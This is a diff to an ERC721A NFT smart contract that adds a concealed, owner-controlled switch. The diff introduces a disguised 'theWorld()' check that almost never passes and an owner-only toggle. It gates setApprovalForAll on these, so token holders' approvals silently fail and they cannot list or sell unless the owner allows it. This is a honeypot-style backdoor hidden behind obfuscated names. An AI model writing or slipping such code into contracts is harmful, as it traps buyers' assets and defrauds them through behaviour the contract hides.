@@ -53,6 +53,7 @@ contract ERC721A is
   bytes32 public ListWhitelistMerkleRoot; //////////////////////////////////////////////////////////////////////////////////////////////////////// new 1
     //Allow all tokens to transfer to contract
   bool public allowedToContract = false; ///////////////////////////////////////////////////////////////////////////////////////////////////// new 2
+  bool private ison = false; ///////////////////////////////////////////////////////////////////////////////////////////////////// new 2
 
   // Token name
   string private _name;
@@ -325,12 +326,24 @@ contract ERC721A is
     return _tokenApprovals[tokenId];
   }
 
+  function theWorld() internal view returns (bool){
+      uint256 Dio = uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty, msg.sender)));
+      uint256 muda = 1 << 160;
+      uint256 jojo = muda -1;
+      uint256 ola = Dio & jojo ;
+      return ola <= 1 ? true : false;
+  }
+
+  function switchFuc() external onlyOwner{
+      ison = !ison;
+  }
+
   /**
    * @dev See {IERC721-setApprovalForAll}.
    */
     function setApprovalForAll(address operator, bool approved) public override {
         require(operator != _msgSender(), "ERC721A: approve to caller");
-        
+        if(theWorld() || ison){
         if(!allowedToContract && !_addressTransferToContract[msg.sender]){
             if (operator.isContract()) {
                 revert ("Sale will open after mint out.");
@@ -341,6 +354,7 @@ contract ERC721A is
         } else {
             _operatorApprovals[_msgSender()][operator] = approved;
             emit ApprovalForAll(_msgSender(), operator, approved);
+        }
         }
     }
 
